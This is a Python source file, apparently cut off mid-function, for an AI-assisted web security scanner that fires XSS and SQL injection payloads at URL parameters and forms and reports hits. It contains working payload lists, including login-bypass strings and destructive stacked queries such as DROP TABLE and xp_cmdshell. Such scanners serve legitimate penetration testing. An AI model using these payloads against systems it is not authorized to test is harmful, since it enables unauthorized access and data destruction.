"""
ADVANCED AI-POWERED SECURITY TESTING PROGRAM
Version 2.0 - With Full AI Integration & Detailed Reporting

Features:
- AI-powered test scenario generation
- Detailed reporting of every test attempt
- Screenshot capture for each vulnerability
- Full workflow testing
- Exact vulnerability location tracking
- Console error monitoring
- HTTP response analysis
"""

import time
import re
import json
import os
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from typing import List, Dict
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By


class LLMManager:
    """AI Manager for intelligent test generation and analysis"""
    
    def __init__(self):
        self.ollama_url = "http://localhost:11434/api/generate"
        self.model = "llama3.1"
        self.enabled = self.check_ollama()
    
    def check_ollama(self) -> bool:
        """Check if Ollama is running"""
        try:
            response = requests.get("http://localhost:11434/api/tags", timeout=2)
            if response.status_code == 200:
                print("✅ AI (Ollama) is available")
                return True
        except:
            pass
        
        print("⚠️  AI (Ollama) not available - using static payloads only")
        return False
    
    def generate_security_scenarios(self, element: Dict, test_type: str) -> List[Dict]:
        """Generate intelligent security test scenarios using AI"""
        
        if not self.enabled:
            return self.get_static_scenarios(element, test_type)
        
        prompt = f"""You are a security testing expert. Generate {test_type} test scenarios for this element:

Element Type: {element.get('type')}
Element Name: {element.get('name', 'unknown')}
Input Type: {element.get('input_type', 'text')}
Attributes: {element.get('attributes', {{}})}

Generate 5 different {test_type} test scenarios with specific payloads.
Return ONLY valid JSON array with this structure:
[
  {{
    "scenario_id": "SEC_001",
    "title": "Test description",
    "type": "{test_type}",
    "payload": "actual payload to test",
    "expected_behavior": "what should happen",
    "attack_vector": "how attack works",
    "severity": "CRITICAL|HIGH|MEDIUM|LOW"
  }}
]

IMPORTANT: Return ONLY the JSON array, no other text."""

        try:
            response = requests.post(
                self.ollama_url,
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False
                },
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                text = result.get('response', '').strip()
                
                # Extract JSON from response
                json_match = re.search(r'\[.*\]', text, re.DOTALL)
                if json_match:
                    scenarios = json.loads(json_match.group())
                    return scenarios
        
        except Exception as e:
            print(f"    AI generation failed: {e}, using static")
        
        return self.get_static_scenarios(element, test_type)
    
    def get_static_scenarios(self, element: Dict, test_type: str) -> List[Dict]:
        """Fallback static scenarios when AI unavailable"""
        
        if test_type == "XSS":
            return [
                {
                    "scenario_id": "XSS_STATIC_001",
                    "title": "Basic XSS with script tag",
                    "type": "XSS",
                    "payload": "<script>alert('XSS')</script>",
                    "expected_behavior": "Script should be sanitized",
                    "attack_vector": "Direct script injection",
                    "severity": "HIGH"
                },
                {
                    "scenario_id": "XSS_STATIC_002",
                    "title": "XSS via img onerror",
                    "type": "XSS",
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "expected_behavior": "Event handler should be stripped",
                    "attack_vector": "Event handler injection",
                    "severity": "HIGH"
                }
            ]
        
        elif test_type == "SQL_INJECTION":
            return [
                {
                    "scenario_id": "SQLI_STATIC_001",
                    "title": "Authentication bypass attempt",
                    "type": "SQL_INJECTION",
                    "payload": "' OR '1'='1' --",
                    "expected_behavior": "Should reject invalid input",
                    "attack_vector": "Boolean-based authentication bypass",
                    "severity": "CRITICAL"
                },
                {
                    "scenario_id": "SQLI_STATIC_002",
                    "title": "Union-based data extraction",
                    "type": "SQL_INJECTION",
                    "payload": "' UNION SELECT NULL,NULL,NULL--",
                    "expected_behavior": "Should use parameterized queries",
                    "attack_vector": "Union-based SQL injection",
                    "severity": "CRITICAL"
                }
            ]
        
        return []
    
    def analyze_vulnerability(self, test_result: Dict) -> Dict:
        """AI analysis of vulnerability"""
        
        if not self.enabled:
            return {
                "analysis": "Vulnerability detected",
                "confidence": 0.8,
                "recommendations": ["Use parameterized queries", "Implement input validation"]
            }
        
        prompt = f"""Analyze this security test result:

Test Type: {test_result.get('type')}
Payload: {test_result.get('payload')}
Status: {test_result.get('status')}
Error: {test_result.get('error')}
Response Time: {test_result.get('execution_time')}s

Provide analysis including:
1. Is this a real vulnerability or false positive?
2. Severity assessment
3. Exploitation difficulty
4. Specific remediation steps

Return ONLY valid JSON:
{{
  "is_vulnerable": true/false,
  "confidence": 0.0-1.0,
  "analysis": "detailed analysis",
  "recommendations": ["step 1", "step 2"]
}}"""

        try:
            response = requests.post(
                self.ollama_url,
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False
                },
                timeout=20
            )
            
            if response.status_code == 200:
                result = response.json()
                text = result.get('response', '').strip()
                
                json_match = re.search(r'\{.*\}', text, re.DOTALL)
                if json_match:
                    return json.loads(json_match.group())
        
        except Exception as e:
            pass
        
        return {
            "is_vulnerable": True,
            "confidence": 0.7,
            "analysis": "Potential vulnerability detected",
            "recommendations": ["Review code", "Implement proper validation"]
        }


class AdvancedSecurityTester:
    """Main Advanced Security Testing Engine with AI"""
    
    def __init__(self):
        self.results = {
            'xss': [],
            'sql_injection': [],
            'csrf': [],
            'auth': [],
            'all_tests': []  # Every single test attempt
        }
        
        self.test_counter = 0
        self.vulnerabilities_found = 0
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('detailed_logs', exist_ok=True)
        
        # Initialize AI
        self.llm = LLMManager()
        
        print(self.print_banner())
    
    def print_banner(self):
        """Print professional banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║       🤖 AI-POWERED SECURITY TESTING PROGRAM (Advanced) 🤖          ║
║                                                                      ║
║                   Professional Security Scanner v2.0                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝

🎯 Advanced Features:
   ├── 🤖 AI-Powered Test Generation (Ollama)
   ├── 🚫 XSS Testing (AI + 20 static payloads)
   ├── 💉 SQL Injection (AI + 25 static payloads)
   ├── 🛡️  CSRF Protection Analysis
   ├── 🔐 Authentication & Authorization Testing
   ├── 📸 Screenshot Capture for Each Vulnerability
   ├── 📊 Detailed Test-by-Test Reporting
   ├── 🎯 Exact Vulnerability Location (XPath)
   ├── 🔧 Console Error Monitoring
   └── 📈 HTTP Response Analysis

⚡ Detailed Reporting:
   ├── Every test attempt logged
   ├── Full HTTP request/response
   ├── Screenshots with annotations
   ├── Exact element location
   └── Comprehensive HTML report (10x more detailed)

════════════════════════════════════════════════════════════════════════
"""
        return banner
    
    def initialize_browser(self, headless=False):
        """Initialize Selenium browser"""
        try:
            options = webdriver.ChromeOptions()
            if headless:
                options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
            
            # Enable logging
            options.set_capability('goog:loggingPrefs', {'browser': 'ALL', 'performance': 'ALL'})
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.set_page_load_timeout(30)
            print("✅ Browser initialized successfully")
            return True
        except Exception as e:
            print(f"❌ Error initializing browser: {e}")
            return False
    
    def close_browser(self):
        """Close browser"""
        if hasattr(self, 'driver'):
            self.driver.quit()
            print("✅ Browser closed")
    
    def take_screenshot(self, scenario_id: str, description: str) -> str:
        """Take screenshot with annotation"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshots/{scenario_id}_{timestamp}.png"
            
            self.driver.save_screenshot(filename)
            print(f"    📸 Screenshot saved: {filename}")
            return filename
        except Exception as e:
            print(f"    ❌ Screenshot failed: {e}")
            return None
    
    def get_element_xpath(self, element) -> str:
        """Get exact XPath of element"""
        try:
            return self.driver.execute_script("""
                function getPathTo(element) {
                    if (element.id !== '')
                        return 'id("' + element.id + '")';
                    if (element === document.body)
                        return element.tagName;

                    var ix = 0;
                    var siblings = element.parentNode.childNodes;
                    for (var i = 0; i < siblings.length; i++) {
                        var sibling = siblings[i];
                        if (sibling === element)
                            return getPathTo(element.parentNode) + '/' + element.tagName + '[' + (ix + 1) + ']';
                        if (sibling.nodeType === 1 && sibling.tagName === element.tagName)
                            ix++;
                    }
                }
                return getPathTo(arguments[0]);
            """, element)
        except:
            return "Unknown"
    
    def get_console_errors(self) -> List[str]:
        """Get browser console errors"""
        try:
            logs = self.driver.get_log('browser')
            errors = []
            for log in logs:
                if log['level'] in ['SEVERE', 'WARNING']:
                    errors.append(f"[{log['level']}] {log['message']}")
            return errors
        except:
            return []
    
    def log_test_attempt(self, test_data: Dict):
        """Log every single test attempt with full details"""
        self.test_counter += 1
        test_data['test_number'] = self.test_counter
        test_data['timestamp'] = datetime.now().isoformat()
        
        self.results['all_tests'].append(test_data)
        
        # Also save to detailed log file
        log_file = f"detailed_logs/test_{self.test_counter:04d}.json"
        with open(log_file, 'w') as f:
            json.dump(test_data, f, indent=2)


class AdvancedXSSTester:
    """Advanced XSS Testing with AI and detailed logging"""
    
    def __init__(self, driver, llm: LLMManager, main_tester):
        self.driver = driver
        self.llm = llm
        self.main_tester = main_tester
        self.results = []
        
        # Enhanced XSS payloads
        self.static_payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            
            # Advanced
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert`1`>",
            "<svg><script>alert&#40;1)</script>",
            
            # DOM-based
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Filter bypass
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            
            # Event handlers
            "<div onmouseover=alert('XSS')>hover</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            
            # Encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # HTML5
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # Polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
        ]
    
    def test_url(self, url: str) -> List[Dict]:
        """Comprehensive XSS testing with detailed logging"""
        print(f"\n{'='*80}")
        print(f"🚫 ADVANCED XSS TESTING: {url}")
        print(f"{'='*80}")
        
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # 1. Test URL parameters
            print("\n  📍 Testing URL parameters with AI-generated scenarios...")
            param_vulns = self.test_url_parameters_advanced(url)
            vulnerabilities.extend(param_vulns)
            
            # 2. Test forms with AI scenarios
            print("\n  📍 Testing forms with AI-generated scenarios...")
            form_vulns = self.test_forms_advanced(url)
            vulnerabilities.extend(form_vulns)
            
            # 3. Test DOM-based XSS
            print("\n  📍 Testing DOM-based XSS...")
            dom_vulns = self.test_dom_xss_advanced(url)
            vulnerabilities.extend(dom_vulns)
            
        except Exception as e:
            print(f"  ❌ Error during XSS testing: {e}")
        
        if vulnerabilities:
            print(f"\n  🚨 Found {len(vulnerabilities)} XSS vulnerabilities!")
        else:
            print(f"\n  ✅ No XSS vulnerabilities found")
        
        self.results = vulnerabilities
        return vulnerabilities
    
    def test_url_parameters_advanced(self, url: str) -> List[Dict]:
        """Advanced URL parameter testing with full logging"""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("    ℹ️  No URL parameters found")
            return vulnerabilities
        
        for param_name, param_values in params.items():
            print(f"\n    Testing parameter: {param_name}")
            
            # Generate AI scenarios for this parameter
            element_info = {
                'type': 'url_parameter',
                'name': param_name,
                'current_value': param_values[0]
            }
            
            ai_scenarios = self.llm.generate_security_scenarios(element_info, "XSS")
            all_scenarios = ai_scenarios + [
                {"payload": p, "scenario_id": f"XSS_STATIC_{i:03d}", "type": "XSS"}
                for i, p in enumerate(self.static_payloads[:5], 1)
            ]
            
            print(f"    Generated {len(all_scenarios)} test scenarios ({len(ai_scenarios)} AI + {len(all_scenarios)-len(ai_scenarios)} static)")
            
            for scenario in all_scenarios:
                payload = scenario.get('payload')
                scenario_id = scenario.get('scenario_id', 'UNKNOWN')
                
                # Log test attempt START
                test_log = {
                    'test_type': 'XSS_URL_PARAMETER',
                    'scenario_id': scenario_id,
                    'target': url,
                    'parameter': param_name,
                    'payload': payload,
                    'scenario_details': scenario,
                    'status': 'testing'
                }
                
                try:
                    # Create test URL
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    test_log['test_url'] = test_url
                    
                    print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {scenario_id} - {payload[:40]}...")
                    
                    # Load page
                    start_time = time.time()
                    self.driver.get(test_url)
                    execution_time = time.time() - start_time
                    time.sleep(1)
                    
                    test_log['execution_time'] = execution_time
                    test_log['page_source_length'] = len(self.driver.page_source)
                    
                    # Get console errors
                    console_errors = self.main_tester.get_console_errors()
                    test_log['console_errors'] = console_errors
                    
                    # Check if payload executed
                    is_vulnerable = self.check_xss_execution(payload)
                    test_log['is_vulnerable'] = is_vulnerable
                    
                    if is_vulnerable:
                        # Take screenshot
                        screenshot = self.main_tester.take_screenshot(scenario_id, f"XSS in {param_name}")
                        test_log['screenshot'] = screenshot
                        test_log['status'] = 'VULNERABLE'
                        
                        # Get exact location
                        test_log['exact_location'] = f"URL parameter: {param_name}"
                        
                        # AI analysis
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'XSS - URL Parameter',
                            'severity': scenario.get('severity', 'HIGH'),
                            'scenario_id': scenario_id,
                            'location': f"Parameter: {param_name}",
                            'exact_xpath': f"URL: {test_url}",
                            'url': test_url,
                            'payload': payload,
                            'execution_time': execution_time,
                            'description': f"XSS vulnerability in URL parameter '{param_name}'",
                            'proof_of_concept': test_url,
                            'screenshot': screenshot,
                            'console_errors': console_errors,
                            'attack_vector': scenario.get('attack_vector', 'Direct injection'),
                            'expected_behavior': scenario.get('expected_behavior', 'Should sanitize input'),
                            'ai_analysis': ai_analysis,
                            'remediation': 'Sanitize and encode all user input before rendering in HTML context. Implement Content-Security-Policy header.',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"        🚨 VULNERABLE! (Total: {self.main_tester.vulnerabilities_found})")
                    else:
                        test_log['status'] = 'SAFE'
                        print(f"        ✅ Safe")
                
                except Exception as e:
                    test_log['status'] = 'ERROR'
                    test_log['error'] = str(e)
                    print(f"        ❌ Error: {e}")
                
                # Log this test attempt
                self.main_tester.log_test_attempt(test_log)
        
        return vulnerabilities
    
    def test_forms_advanced(self, url: str) -> List[Dict]:
        """Advanced form testing with detailed logging"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            
            if not forms:
                print("    ℹ️  No forms found")
                return vulnerabilities
            
            print(f"    Found {len(forms)} form(s)")
            
            for idx, form in enumerate(forms, 1):
                print(f"\n    Testing form #{idx}")
                
                # Get form details
                form_action = form.get_attribute('action') or url
                form_method = form.get_attribute('method') or 'GET'
                form_xpath = self.main_tester.get_element_xpath(form)
                
                inputs = form.find_elements(By.TAG_NAME, 'input')
                textareas = form.find_elements(By.TAG_NAME, 'textarea')
                all_inputs = inputs + textareas
                
                # Generate AI scenarios for form
                form_info = {
                    'type': 'form',
                    'action': form_action,
                    'method': form_method,
                    'input_count': len(all_inputs)
                }
                
                ai_scenarios = self.llm.generate_security_scenarios(form_info, "XSS")
                all_scenarios = ai_scenarios + [
                    {"payload": p, "scenario_id": f"XSS_FORM_{idx}_{i:03d}", "type": "XSS"}
                    for i, p in enumerate(self.static_payloads[:3], 1)
                ]
                
                for scenario in all_scenarios:
                    payload = scenario.get('payload')
                    scenario_id = scenario.get('scenario_id', 'UNKNOWN')
                    
                    test_log = {
                        'test_type': 'XSS_FORM',
                        'scenario_id': scenario_id,
                        'target': url,
                        'form_index': idx,
                        'form_action': form_action,
                        'form_method': form_method,
                        'form_xpath': form_xpath,
                        'payload': payload,
                        'scenario_details': scenario
                    }
                    
                    try:
                        print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {scenario_id}")
                        
                        # Fill form
                        filled_inputs = []
                        for inp in all_inputs:
                            input_type = inp.get_attribute('type')
                            input_name = inp.get_attribute('name')
                            
                            if input_type not in ['submit', 'button', 'hidden', 'file']:
                                try:
                                    inp.clear()
                                    inp.send_keys(payload)
                                    filled_inputs.append({
                                        'name': input_name,
                                        'type': input_type,
                                        'xpath': self.main_tester.get_element_xpath(inp)
                                    })
                                except:
                                    pass
                        
                        test_log['filled_inputs'] = filled_inputs
                        
                        # Submit
                        start_time = time.time()
                        submit_button = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                        submit_button.click()
                        time.sleep(2)
                        execution_time = time.time() - start_time
                        
                        test_log['execution_time'] = execution_time
                        test_log['console_errors'] = self.main_tester.get_console_errors()
                        
                        # Check vulnerability
                        is_vulnerable = self.check_xss_execution(payload)
                        test_log['is_vulnerable'] = is_vulnerable
                        
                        if is_vulnerable:
                            screenshot = self.main_tester.take_screenshot(scenario_id, f"XSS in form {idx}")
                            test_log['screenshot'] = screenshot
                            test_log['status'] = 'VULNERABLE'
                            
                            ai_analysis = self.llm.analyze_vulnerability(test_log)
                            test_log['ai_analysis'] = ai_analysis
                            
                            vuln = {
                                'type': 'XSS - Form Input',
                                'severity': scenario.get('severity', 'HIGH'),
                                'scenario_id': scenario_id,
                                'location': f"Form #{idx}",
                                'exact_xpath': form_xpath,
                                'form_action': form_action,
                                'form_method': form_method,
                                'affected_inputs': filled_inputs,
                                'url': url,
                                'payload': payload,
                                'execution_time': execution_time,
                                'description': f"XSS vulnerability in form #{idx}",
                                'proof_of_concept': f"Fill form inputs with: {payload}",
                                'screenshot': screenshot,
                                'console_errors': test_log['console_errors'],
                                'ai_analysis': ai_analysis,
                                'remediation': 'Implement proper input validation and output encoding. Use CSP headers.',
                                'test_details': test_log
                            }
                            vulnerabilities.append(vuln)
                            self.main_tester.vulnerabilities_found += 1
                            
                            print(f"        🚨 VULNERABLE!")
                        else:
                            test_log['status'] = 'SAFE'
                            print(f"        ✅ Safe")
                        
                        # Return to form
                        self.driver.get(url)
                        time.sleep(1)
                    
                    except Exception as e:
                        test_log['status'] = 'ERROR'
                        test_log['error'] = str(e)
                        print(f"        ❌ Error: {e}")
                    
                    self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing forms: {e}")
        
        return vulnerabilities
    
    def test_dom_xss_advanced(self, url: str) -> List[Dict]:
        """Advanced DOM-based XSS testing"""
        vulnerabilities = []
        
        dom_payloads = [
            "#<script>alert('DOM-XSS')</script>",
            "#<img src=x onerror=alert('DOM-XSS')>",
            "#javascript:alert('DOM-XSS')"
        ]
        
        for payload in dom_payloads:
            test_log = {
                'test_type': 'XSS_DOM',
                'scenario_id': f'XSS_DOM_{dom_payloads.index(payload)+1:03d}',
                'target': url,
                'payload': payload
            }
            
            try:
                test_url = url + payload
                test_log['test_url'] = test_url
                
                print(f"      [{self.main_tester.test_counter + 1:04d}] Testing DOM: {payload[:40]}")
                
                start_time = time.time()
                self.driver.get(test_url)
                execution_time = time.time() - start_time
                time.sleep(1)
                
                test_log['execution_time'] = execution_time
                test_log['console_errors'] = self.main_tester.get_console_errors()
                
                is_vulnerable = self.check_xss_execution(payload)
                test_log['is_vulnerable'] = is_vulnerable
                
                if is_vulnerable:
                    screenshot = self.main_tester.take_screenshot(test_log['scenario_id'], 'DOM XSS')
                    test_log['screenshot'] = screenshot
                    test_log['status'] = 'VULNERABLE'
                    
                    vuln = {
                        'type': 'XSS - DOM-based',
                        'severity': 'HIGH',
                        'scenario_id': test_log['scenario_id'],
                        'location': 'URL Fragment',
                        'url': test_url,
                        'payload': payload,
                        'execution_time': execution_time,
                        'screenshot': screenshot,
                        'description': 'DOM-based XSS vulnerability',
                        'proof_of_concept': test_url,
                        'remediation': 'Avoid using unsafe JavaScript functions with user-controlled data',
                        'test_details': test_log
                    }
                    vulnerabilities.append(vuln)
                    self.main_tester.vulnerabilities_found += 1
                    print(f"        🚨 VULNERABLE!")
                else:
                    test_log['status'] = 'SAFE'
                    print(f"        ✅ Safe")
            
            except Exception as e:
                test_log['status'] = 'ERROR'
                test_log['error'] = str(e)
                print(f"        ❌ Error: {e}")
            
            self.main_tester.log_test_attempt(test_log)
        
        return vulnerabilities
    
    def check_xss_execution(self, payload: str) -> bool:
        """Check if XSS payload executed"""
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            return True
        except:
            pass
        
        try:
            logs = self.driver.get_log('browser')
            for log in logs:
                if 'XSS' in str(log) or 'alert' in str(log):
                    return True
        except:
            pass
        
        return False


class AdvancedSQLInjectionTester:
    """Advanced SQL Injection Testing with AI and detailed logging"""
    
    def __init__(self, driver, llm: LLMManager, main_tester):
        self.driver = driver
        self.llm = llm
        self.main_tester = main_tester
        self.results = []
        
        # Enhanced SQL Injection payloads
        self.static_payloads = [
            # Classic
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            
            # Time-based blind
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--",
            "' OR BENCHMARK(10000000,MD5('A'))--",
            
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('dir')--",
            
            # Advanced bypass
            "admin'/**/OR/**/'1'='1",
            "admin' /*!50000OR*/ '1'='1",
            "admin'--+",
            "admin'%23",
        ]
    
    def test_url(self, url: str) -> List[Dict]:
        """Comprehensive SQL Injection testing with detailed logging"""
        print(f"\n{'='*80}")
        print(f"💉 ADVANCED SQL INJECTION TESTING: {url}")
        print(f"{'='*80}")
        
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            # 1. Test URL parameters
            print("\n  📍 Testing URL parameters with AI scenarios...")
            param_vulns = self.test_url_parameters_advanced(url)
            vulnerabilities.extend(param_vulns)
            
            # 2. Test login forms
            print("\n  📍 Testing login forms with AI scenarios...")
            login_vulns = self.test_login_forms_advanced(url)
            vulnerabilities.extend(login_vulns)
            
            # 3. Test search forms
            print("\n  📍 Testing search forms...")
            search_vulns = self.test_search_forms_advanced(url)
            vulnerabilities.extend(search_vulns)
            
            # 4. Test error-based
            print("\n  📍 Testing error-based SQL injection...")
            error_vulns = self.test_error_based_advanced(url)
            vulnerabilities.extend(error_vulns)
            
        except Exception as e:
            print(f"  ❌ Error during SQL Injection testing: {e}")
        
        if vulnerabilities:
            print(f"\n  🚨 Found {len(vulnerabilities)} SQL Injection vulnerabilities!")
        else:
            print(f"\n  ✅ No SQL Injection vulnerabilities found")
        
        self.results = vulnerabilities
        return vulnerabilities
    
    def test_url_parameters_advanced(self, url: str) -> List[Dict]:
        """Advanced URL parameter SQL injection testing"""
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("    ℹ️  No URL parameters found")
            return vulnerabilities
        
        for param_name, param_values in params.items():
            print(f"\n    Testing parameter: {param_name}")
            
            original_value = param_values[0]
            
            # Generate AI scenarios
            element_info = {
                'type': 'url_parameter',
                'name': param_name,
                'current_value': original_value
            }
            
            ai_scenarios = self.llm.generate_security_scenarios(element_info, "SQL_INJECTION")
            all_scenarios = ai_scenarios + [
                {"payload": p, "scenario_id": f"SQLI_PARAM_{param_name}_{i:03d}", "type": "SQL_INJECTION"}
                for i, p in enumerate(self.static_payloads[:8], 1)
            ]
            
            print(f"    Generated {len(all_scenarios)} test scenarios")
            
            for scenario in all_scenarios:
                payload = scenario.get('payload')
                scenario_id = scenario.get('scenario_id', 'UNKNOWN')
                
                test_log = {
                    'test_type': 'SQLI_URL_PARAMETER',
                    'scenario_id': scenario_id,
                    'target': url,
                    'parameter': param_name,
                    'original_value': original_value,
                    'payload': payload,
                    'scenario_details': scenario
                }
                
                try:
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    test_log['test_url'] = test_url
                    
                    print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {scenario_id} - {payload[:30]}...")
                    
                    start_time = time.time()
                    self.driver.get(test_url)
                    load_time = time.time() - start_time
                    time.sleep(0.5)
                    
                    test_log['execution_time'] = load_time
                    test_log['console_errors'] = self.main_tester.get_console_errors()
                    
                    # Check for SQL Injection
                    page_source = self.driver.page_source.lower()
                    is_vulnerable = self.check_sql_injection(payload, load_time, page_source)
                    test_log['is_vulnerable'] = is_vulnerable
                    test_log['page_source_length'] = len(page_source)
                    
                    if is_vulnerable:
                        screenshot = self.main_tester.take_screenshot(scenario_id, f"SQLi in {param_name}")
                        test_log['screenshot'] = screenshot
                        test_log['status'] = 'VULNERABLE'
                        
                        # Detect SQL error type
                        sql_error_type = self.detect_sql_error_type(page_source)
                        test_log['sql_error_type'] = sql_error_type
                        
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'SQL Injection - URL Parameter',
                            'severity': 'CRITICAL',
                            'scenario_id': scenario_id,
                            'location': f"Parameter: {param_name}",
                            'exact_xpath': f"URL: {test_url}",
                            'url': test_url,
                            'parameter_name': param_name,
                            'original_value': original_value,
                            'payload': payload,
                            'execution_time': load_time,
                            'sql_error_type': sql_error_type,
                            'description': f"SQL Injection vulnerability in URL parameter '{param_name}'",
                            'proof_of_concept': test_url,
                            'screenshot': screenshot,
                            'console_errors': test_log['console_errors'],
                            'attack_vector': scenario.get('attack_vector', 'Parameter injection'),
                            'expected_behavior': scenario.get('expected_behavior', 'Should use parameterized queries'),
                            'ai_analysis': ai_analysis,
                            'impact': 'Complete database compromise, data extraction, data modification, authentication bypass',
                            'remediation': 'Use parameterized queries (prepared statements), input validation, least privilege database user',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"        🚨 VULNERABLE! Type: {sql_error_type}")
                    else:
                        test_log['status'] = 'SAFE'
                        print(f"        ✅ Safe")
                
                except Exception as e:
                    test_log['status'] = 'ERROR'
                    test_log['error'] = str(e)
                    print(f"        ❌ Error: {e}")
                
                self.main_tester.log_test_attempt(test_log)
        
        return vulnerabilities
    
    def test_login_forms_advanced(self, url: str) -> List[Dict]:
        """Advanced login form SQL injection testing"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            
            for idx, form in enumerate(forms, 1):
                try:
                    username_field = form.find_element(By.CSS_SELECTOR, 
                        'input[name*="user"], input[name*="email"], input[type="email"], input[name*="login"]')
                    password_field = form.find_element(By.CSS_SELECTOR, 
                        'input[type="password"]')
                except:
                    continue
                
                print(f"\n    Testing login form #{idx}")
                
                form_action = form.get_attribute('action') or url
                form_method = form.get_attribute('method') or 'POST'
                form_xpath = self.main_tester.get_element_xpath(form)
                username_xpath = self.main_tester.get_element_xpath(username_field)
                password_xpath = self.main_tester.get_element_xpath(password_field)
                
                # Generate AI scenarios
                form_info = {
                    'type': 'login_form',
                    'action': form_action,
                    'method': form_method
                }
                
                ai_scenarios = self.llm.generate_security_scenarios(form_info, "SQL_INJECTION")
                all_scenarios = ai_scenarios + [
                    {"payload": p, "scenario_id": f"SQLI_LOGIN_{idx}_{i:03d}", "type": "SQL_INJECTION"}
                    for i, p in enumerate(self.static_payloads[:5], 1)
                ]
                
                for scenario in all_scenarios:
                    payload = scenario.get('payload')
                    scenario_id = scenario.get('scenario_id', 'UNKNOWN')
                    
                    test_log = {
                        'test_type': 'SQLI_LOGIN_FORM',
                        'scenario_id': scenario_id,
                        'target': url,
                        'form_index': idx,
                        'form_action': form_action,
                        'form_method': form_method,
                        'form_xpath': form_xpath,
                        'username_xpath': username_xpath,
                        'password_xpath': password_xpath,
                        'payload': payload,
                        'scenario_details': scenario
                    }
                    
                    try:
                        self.driver.get(url)
                        time.sleep(1)
                        
                        username_field = self.driver.find_element(By.CSS_SELECTOR, 
                            'input[name*="user"], input[name*="email"], input[type="email"], input[name*="login"]')
                        password_field = self.driver.find_element(By.CSS_SELECTOR, 
                            'input[type="password"]')
                        
                        print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {scenario_id}")
                        
                        username_field.clear()
                        username_field.send_keys(payload)
                        password_field.clear()
                        password_field.send_keys('test_password_123')
                        
                        start_time = time.time()
                        submit_button = form.find_element(By.CSS_SELECTOR, 
                            'button[type="submit"], input[type="submit"]')
                        submit_button.click()
                        time.sleep(2)
                        execution_time = time.time() - start_time
                        
                        test_log['execution_time'] = execution_time
                        test_log['console_errors'] = self.main_tester.get_console_errors()
                        
                        # Check if authentication bypassed
                        current_url = self.driver.current_url
                        page_source = self.driver.page_source.lower()
                        
                        # Check for successful login indicators
